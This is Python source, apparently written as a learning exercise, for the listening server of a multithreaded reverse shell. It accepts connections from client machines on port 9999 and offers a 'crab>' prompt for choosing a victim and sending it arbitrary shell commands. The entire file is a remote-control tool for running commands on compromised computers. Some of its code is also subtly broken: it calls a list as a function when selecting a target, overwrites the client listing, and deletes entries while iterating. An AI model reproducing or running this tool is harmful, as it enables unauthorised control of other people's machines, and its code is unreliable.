# this is library used for socket functions
import socket

# used to implement command line and terminal commands into a python file
import sys

# V2 of this Reverse shell will use multithreading to handle multiple client machines
import threading
import time
from queue import Queue

# One thread needed to listen for connections and accept connections when a new client is trying to connect
# Second thread needed to handle connections with existing clients and sending/executing commands
NUMBER_OF_THREADS = 2
# first param is first thread and second param is second thread
JOB_NUMBER = [1, 2]

queue = Queue()
# Whenever a socket connection is accepted for a client, the output of .accept() is a connection object and address list
# That address list contains the IP and port number as seen in accept_socket() function defined further down
# these two arrays will hold those values
all_connections = []
all_address = []

# function to create a socket
def create_socket():
    # enclose within try catch incase socket creation fails and will print the error message
    try:
        # first will define some global variables to hold ip of host and port number
        global host
        global port

        global s # the variable for our socket

        host = ""   # for now we are in the server file and it will be used so can leave this empty
        port = 9999 # uncommon port not used alot

        s = socket.socket() # initialize socket

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


#  function for Binding the socket and listening for connections
def bind_socket():
    # enclose within try catch incase socket binding fails and will print the error message
    # however we will continue to attempt to bind if fails (done through recursion)
    try:
        # to access global variables declared previously in another function, we have to use 'global' keyword again
        global host
        global port

        global s  # the variable for our socket

        print ("Binding the Port: " + str(port))

        # this double bracket format is known as tuple in python
        s.bind((host, port))

        # now server will listen for connections and tolerate a maximum of 5 bad connections before throwing an error
        s.listen(5)

    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")

        # recursive function call (will try and bind again)
        bind_socket()

# Hanlding connections from multiple client and saving to a list

def accepting_connections():
    # first make sure to close all previous connections in that list that were opened in a previous run if any
    for c in all_connections:
        c.close()
    #as well as actually deleting all the elements of each list so they are fresh
    del all_connections[:]
    del all_address[:]

    # infinte while loop to run and listen for connections and add any new connections one by one
    while True:
        try:
            conn, address = s.accept()
            # if client connects and nothing is being done with it, it will time out
            # this setblocking function prevents that time out from happening
            s.setblocking(1)

            all_connections.append(conn)
            all_address.append(address)

            # remember "address" is actually a list and the first element of it is the IP address
            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")

# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected clients
# Interactive prompt for sending commands

# custom crab shell commands
# crab> list
# function above will show list of all connections. 'crab' keyword used to access custom functions (crab shell)

def start_crab():

    while True:
        cmd = input('crab> ')
        if cmd == 'list':
            list_connections()

        # else if the 'select' statement is somewhere in that cmd function
        elif 'select' in cmd:
            conn = get_target(cmd)
            # checks if the connection object exists or not
            if conn is not None:
                # send commands to that specific client
                send_target_commands(conn)
        else:
            print("Command not recognized as valid command in crab shell")

# Display all current active connections with the client
def list_connections():
    results = ''

    # enumerate basically does conn++ with the i being the counter starting from 0
    for i, conn in enumerate(all_connections):
        try:
            # will try to send to (dummy connection)whatever client element we are at to see if connection is
            # still active or not
            conn.send(str.encode(' '))
            # if successfull we will receive a response in bytes, but if not, this .recv() function will throw exception
            conn.recv(20480)
        except:
            # if the exception is thrown, we know that connection is not active and to delete it from the list
            del all_connections[i]
            del all_address[i]
            # then if this is the case, will ignore any further code below and will go to the next iteration of loop
            continue

        results = str(i) + "  " + str(all_address[i][0]) + "  " + str(all_address[i][1]) + "\n"

    # now done looping through clients. Now we print active connections
    print("-----Clients-----" + "\n" + results)

# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ','') # target = id
        target = int(target) # type cast
        conn = all_connections(target)
        print("You are now connected to : " + str(all_address[target][0]))
        # This will basically tell us that we are connected to our client and are not in the interactive menu anymore
        # last param of end="" actually prevents the cursor from going to the new line to prevent errors
        print(str(all_address[target][0]) + ">", end="")

        # if successful we should have a connection object to return:
        return conn

    except:
        print("Selection not valid")

# send commands to client(target machine)
def send_target_commands(conn):
    # conduct infinite while loop allowing us to send multiple commands before connection gets closed
    while True:
        try:
            # takes input from command prompt
            cmd = input()

            # if command is to quit
            if cmd == 'quit':
                # This will break the while True loop and will go back to start_crab function
                break

            # anything travelling over the connection between 2 computers is sent in bytes
            # to actually know if the user typed something into the command prompt we need to encode to bytes
            # and check if the length of that byte string is > 0. if it is, this means a command has been entered into cmd
            if len(str.encode(cmd)) > 0:
                # to send messages got to be converted from string to bytes
                conn.send(str.encode(cmd))
                # to receive messages got to be converted from bytes to string
                # in this case using the encoding format of utf-8 and in chunks of 1024 bits
                client_response = str(conn.recv(20480), "utf-8")

                # end="" basically allows the command prompt to go to the next line after generating output (as it would)
                print(client_response, end="")
        except:
            print("Error sending commands")
            # break statement needed here as well so incase one connection becomes inactive, go back out to start_crab
            break


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):

        # creating a thread
        # 'target' parameter is used to specify the kind of work the thread will do
        # in this case one thread is needed for hanlding connections and one for sending commands
        t = threading.Thread(target=work)

        # this daemon being True will make sure that whenever the program ends, make sure the thread also ends.
        # this will make sure memory is not overloaded
        t.daemon = True

        t.start()

#o next job that is in the queue
def work():
    while True:
        x = queue.get() # gets job number from the queue. Possible ones are only 1 or 2 since we have 2 jobs currently

        # first thread responsible for setting up the connections
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        # second thread responsible for crab shell (sending commands)
        if x == 2:
            start_crab()

        queue.task_done()



def create_jobs():
    # currently set at 2 jobs so x will start at 1
    for x in JOB_NUMBER:
        # Jobs are held in a queue not a list
        queue.put(x)

    queue.join()


create_workers()
create_jobs()